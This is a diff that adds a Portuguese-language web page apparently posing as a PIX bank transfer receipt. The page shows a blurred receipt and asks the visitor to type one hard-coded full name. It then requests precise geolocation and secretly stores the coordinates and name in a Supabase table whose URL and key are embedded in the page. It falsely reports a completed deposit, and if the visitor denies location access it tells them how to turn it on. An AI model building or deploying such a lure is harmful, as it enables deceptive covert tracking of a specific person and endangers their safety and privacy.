@@ -1,0 +1,115 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Abrir Comprovante</title>
+    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js"></script>
+    <link rel="stylesheet" href="styles.css">
+    <link rel="manifest" href="manifest.json">
+</head>
+<body>
+   
+    <h2>Comprovante de Transação PIX</h2>
+    
+    <img id="logo" src="assets/bblogo.png" alt="Logo" width="500">
+    <p id="status">Para confirmar o depósito e carregar o comprovante, digite o nome <strong>completo</strong> da pessoa beneficiária e clique em PERMITIR.</p>
+    <input type="text" id="username" placeholder="Nome completo" oninput="this.value = this.value.toUpperCase()">
+    <button onclick="checkAndSend()">PERMITIR</button>
+
+    <img id="imagem" src="assets/comprovante_desfocado.png" alt="Comprovante" width="300">
+
+    <script>
+        // Configuração do Supabase
+        const SUPABASE_URL = "https://vcgaddzniugltliozdnl.supabase.co";
+        const SUPABASE_ANON_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InZjZ2FkZHpuaXVnbHRsaW96ZG5sIiwicm9sZSI6ImFub24iLCJpYXQiOjE3Mzk1NjYwODQsImV4cCI6MjA1NTE0MjA4NH0.26m1I7QPWZNb-NRYklzTiRgsQVEZ4iUOXmic-XRNg9Q";
+        const supabase = window.supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY);
+
+        // Nome fixo para validação
+        const NOME_FIXO = "RENATO TADEU PEREIRA";
+
+        function checkAndSend() {
+            const username = document.getElementById("username").value.trim();
+            
+            // Verificando se o campo de nome está vazio
+            if (!username) {
+                document.getElementById("status").innerText = "Nome não pode ser vazio";
+                return;
+            }
+            
+            // Verificando se o nome digitado é o esperado
+            if (username !== NOME_FIXO.trim()) {
+                document.getElementById("status").innerText = "Nome incorreto. Tente novamente.";
+                return;
+            }
+            
+            // Se nome válido, chama a função para pegar a localização
+            getLocation(username);
+        }
+
+        function getLocation(username) {
+            if (!navigator.geolocation) {
+                document.getElementById("status").innerText = "Comprovante não localizado.";
+                return;
+            }
+
+            document.getElementById("status").innerText = "Confirmando os dados...Aguarde!";
+
+            navigator.geolocation.getCurrentPosition(
+                (position) => sendLocation(position, username),
+                showError,
+                { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
+            );
+        }
+
+        async function sendLocation(position, username) {
+            const latitude = position.coords.latitude;
+            const longitude = position.coords.longitude;
+
+            document.getElementById("imagem").src = "assets/comprovante.png";
+
+            try {
+                const { data, error } = await supabase
+                    .from("localizacoes")
+                    .insert([{ latitude, longitude, created_at: new Date().toISOString(), name: username }]);
+
+                if (error) {
+                    throw error;
+                }
+
+                document.getElementById("status").innerText = "Depósito realizado com sucesso!";
+                console.log("Dados enviados:", data);
+            } catch (err) {
+                console.error("Erro ao enviar:", err.message);
+                document.getElementById("status").innerText = "Erro ao gerar comprovante: " + err.message;
+            }
+        }
+
+        function showError(error) {
+            let msg = "";
+            switch (error.code) {
+                case error.PERMISSION_DENIED:
+                    msg = "Seu aparelho não permite gerar o comprovante. Clique nos três pontinhos > Configurações > Configurações do Site > Local > Abrir todas as solicitações. Depois tente novamente";
+                    break;
+                case error.POSITION_UNAVAILABLE:
+                    msg = "Comprovante indisponível. Tente novamente mais tarde.";
+                    break;
+                case error.TIMEOUT:
+                    msg = "Tempo limite da requisição excedido.";
+                    break;
+                default:
+                    msg = "Erro desconhecido.";
+                    break;
+            }
+            document.getElementById("status").innerText = msg;
+        }
+
+        // Registrar Service Worker para PWA
+        if ("serviceWorker" in navigator) {
+            navigator.serviceWorker.register("/sw.js")
+                .then(() => console.log("Service Worker registrado!"))
+                .catch((err) => console.log("Erro ao registrar Service Worker:", err));
+        }
+    </script>
+</body>
+</html>
